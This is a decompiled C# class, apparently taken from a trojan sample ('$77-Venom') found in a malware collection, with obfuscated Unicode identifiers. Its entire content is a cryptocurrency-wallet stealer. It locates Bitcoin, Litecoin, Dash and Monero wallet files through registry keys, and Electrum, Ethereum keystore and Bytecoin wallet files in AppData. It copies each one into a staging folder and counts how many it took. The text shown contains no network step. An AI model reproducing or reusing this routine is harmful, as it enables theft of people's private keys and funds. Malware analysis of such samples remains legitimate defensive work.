// Decompiled with JetBrains decompiler
// Type: 弆盜᱌꽷�㾈ꩻ㵰ᢛ솿焟㯎옅࠼㴕邺鶍馧
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.IO;

public class 弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧
{
  public static int 㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;

  public static void 筵ヹ棕\uF484䄷ݛᎿ\uE9AD\u20FD蠲ᗆ\u215D压\uF1C4ᅴ맆쬐ᬓ비ᥕ(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\BitcoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
          ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \uF3A1ⴥ纁訖寱蛭쒬ꇑ귞蹸䁖귩\u1CAB쵛蟵\uFFFD\uF092氂\uE700나(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Electrum\\");
        file.CopyTo(directorypath + "\\Electrum\\" + file.Name);
        ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void 烛溱ꬖ梣崻\uF094㖢ㄨ\uF858\uFFFD觶ꄽ嶬\uE08D뗟繨攐\uEB81\u2E8E덑(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\LitecoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
          ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void 토硸믡狛ᦪ辣\uF469웤в㞻\u09F4怦ជ\uE746눇ꂒﳊ䍷݈䢙(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Ethereum\\");
        file.CopyTo(directorypath + "\\Ethereum\\" + file.Name);
        ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void 懰ￖ\u0879\uE6E0\uF803㖢欺㱖츥ﳃ렔ꚼㅶ\uE387뵿췦싗\u232F㻑䍠(string directorypath)
  {
    try
    {
      foreach (FileInfo file in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
      {
        Directory.CreateDirectory(directorypath + "\\Bytecoin\\");
        if (file.Extension.Equals(".wallet"))
        {
          file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
          ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \uF873ὓ㦐ሶ탿\u29F9큒ட\uEF81蠈硽\u2486聴脣ꒅꛪ之뗒鄡ꔁ(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\DashCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
          ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \u0F02ᆫꮊ懶䭄ⱥ姴\uEC31뇈쪑\uE034䕣汐噩\u0A3D잘ﾡ傡䶧\uE37A(string directorypath)
  {
    try
    {
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
      {
        try
        {
          Directory.CreateDirectory(directorypath + "\\Monero\\");
          string sourceFileName = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
          Directory.CreateDirectory(directorypath + "\\Monero\\");
          File.Copy(sourceFileName, directorypath + "\\Monero\\" + sourceFileName.Split('\\')[sourceFileName.Split('\\').Length - 1]);
          ++弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
    }
  }

  public static void \u29E1쭻潍螪석ꊆ鈎Ţ嵁ꤵ픴伞敫ވ\uA7C5愭\uE7B4ꇚವഺ(string directorypath)
  {
  }

  public static int \u32F3汻ֵㅫ赵킬蟫㔰\uF844夐蚆\uFFFDԵыကᰏ䃶㥜饫줲(string cryptoDir)
  {
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.懰ￖ\u0879\uE6E0\uF803㖢欺㱖츥ﳃ렔ꚼㅶ\uE387뵿췦싗\u232F㻑䍠(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.筵ヹ棕\uF484䄷ݛᎿ\uE9AD\u20FD蠲ᗆ\u215D压\uF1C4ᅴ맆쬐ᬓ비ᥕ(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.\uF873ὓ㦐ሶ탿\u29F9큒ட\uEF81蠈硽\u2486聴脣ꒅꛪ之뗒鄡ꔁ(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.\uF3A1ⴥ纁訖寱蛭쒬ꇑ귞蹸䁖귩\u1CAB쵛蟵\uFFFD\uF092氂\uE700나(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.토硸믡狛ᦪ辣\uF469웤в㞻\u09F4怦ជ\uE746눇ꂒﳊ䍷݈䢙(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.烛溱ꬖ梣崻\uF094㖢ㄨ\uF858\uFFFD觶ꄽ嶬\uE08D뗟繨攐\uEB81\u2E8E덑(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.\u0F02ᆫꮊ懶䭄ⱥ姴\uEC31뇈쪑\uE034䕣汐噩\u0A3D잘ﾡ傡䶧\uE37A(cryptoDir);
    弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.\u29E1쭻潍螪석ꊆ鈎Ţ嵁ꤵ픴伞敫ވ\uA7C5愭\uE7B4ꇚವഺ(cryptoDir);
    return 弆盜\u1C4C꽷\uFFFD㾈ꩻ㵰\uEEFCᢛ솿\uEF65焟㯎옅\u083C㴕邺鶍馧.㚣\uE56E쌢䂩寰왘㲅妒\uFFFDĔ\u2314硳힑玚懚\uE864ƒ\uEBA4룐兖;
  }
}
